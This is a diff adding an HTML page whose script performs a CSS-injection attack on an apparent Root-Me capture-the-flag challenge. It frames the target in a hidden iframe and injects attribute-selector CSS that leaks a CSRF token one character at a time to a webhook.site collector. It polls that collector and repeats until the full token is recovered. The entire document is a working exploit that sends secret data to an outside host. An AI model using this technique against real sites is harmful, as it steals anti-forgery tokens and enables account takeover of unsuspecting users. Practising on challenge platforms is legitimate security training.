@@ -1,0 +1,85 @@
+<html>
+    <style>
+        #current {
+            font-size: 32px;
+            color: red;
+        }
+
+        #time_to_next {
+            font-size: 24px;
+            color: black;
+        }
+
+        #frames {
+            visibility: hidden;
+        }
+    </style>
+    <body>
+        <div id="current"></div>
+        <div id="time_to_next"></div>
+        <div id="frames"></div>
+    </body>
+    <script>
+        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split("");
+        known = "";
+        target_time = new Date();
+        timer = 0;
+
+        function test_char(known, chars) {
+            // Remove all the frames
+            document.getElementById("frames").innerHTML = "";
+
+            // Append the chars with the known chars
+            css = build_css(chars.map(v => known + v));
+
+            // Create an iframe to try the attack. If `X-Frame-Options` is blocking this you could use a new tab...
+            frame = document.createElement("iframe");
+            frame.src = "http://challenge01.root-me.org:58005/?style=" + css;
+            frame.style="visibility: hidden;"; //gotta be sneaky sneaky like
+            document.getElementById("frames").appendChild(frame);
+
+            // timer stuff because we want to be l33t
+            clearInterval(timer);
+            target_time = new Date();
+            target_time.setSeconds(target_time.getSeconds() + 3);
+            timer = setInterval(function() {
+                var current_time = new Date();
+                diff = target_time - current_time;
+                document.getElementById("time_to_next").innerHTML = "Time to next reload: " + diff / 1000;
+            }, 50);
+
+            // in 3 seconds, after the iframe loads, check to see if we got a response yet
+            setTimeout(function() {
+                var oReq = new XMLHttpRequest();
+                oReq.addEventListener("load", known_listener);
+                oReq.open("GET", "https://webhook.site/9b4d15f9-6b9a-4a46-9a82-6ad47d0228f5/currently_known_token");
+                oReq.send();
+            }, 3000);
+        }
+
+        function build_css(values) {
+            css_payload = "";
+            for(var value in values) {
+                css_payload += "input[name=csrf][value^="
+                    + values[value]
+                    + "]~*{background-image:url(https://webhook.site/9b4d15f9-6b9a-4a46-9a82-6ad47d0228f5/"
+                    + values[value]
+                    + ")%3B}"; //can't use an actual semicolon because that has a meaning in a url
+            }
+            return css_payload;
+        }
+
+        function known_listener () {
+            document.getElementById("current").innerHTML = "Current Token: " + this.responseText;
+            if(known != this.responseText) {
+                known = this.responseText;
+                test_char(known, chars);
+            } else {
+                known = this.responseText;
+                alert("CSRF token is: " + known);
+            }
+        }
+
+        test_char("", chars);
+    </script>
+</html>
